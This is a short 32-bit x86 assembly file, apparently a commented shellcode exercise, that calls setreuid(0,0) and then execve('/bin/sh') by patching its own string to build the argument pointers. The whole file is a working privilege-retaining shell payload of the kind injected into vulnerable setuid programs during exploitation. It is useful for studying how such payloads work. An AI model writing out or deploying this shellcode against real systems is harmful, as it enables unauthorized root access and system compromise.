BITS 32;
section		.data
filepath	db	"/bin/shXAAAABBBB"

section		.text
global		_start	;Entry Point fo ELF linking
_start

;setreuid(uid_t ruid, uid_t euid)
mov eax, 70			;parm 70 into eax, syscall #70, to set uid
mov ebx, 0			;parm 0 into ebx, set real uid to root
mov ecx, 0			;parm 0 into ecx, set effective uid to root
int 0x80			;interrupt kernel promoting user to su if possible

;execve(const char *filenm, char *const argv[] (in EBX), char * const envp[](int EDX) 
; Hope to start shell inheriting parents priviledges

mov eax, 0			;follow calling conventions for execve
mov ebx, filepath	;ebx now has the address of the attack string
mov [ebx+7], al		;replace X in string with 0, al register = /x00 is 1 byte long
					;(7 bytes offset from the beginning, terminate string ASCII null)
mov [ebx+8], ebx	;replace 4 bytes "AAAA" with address of the "filepath"
					;string offset 8 bytes from ebx
mov [ebx+12], eax  	;terminate string w/NULL address (4 bytes of 0)
					;replacing BBBB(12 bytes offset)
mov eax, 11			;execve is syscall #11
lea ecx, [ebx+8]	;ecx has 32bit address where AAAA was in the string
					;points to "filepath"
lea edx, [ebx+12]	;address of Null where BBBB was in the string
int 0x80
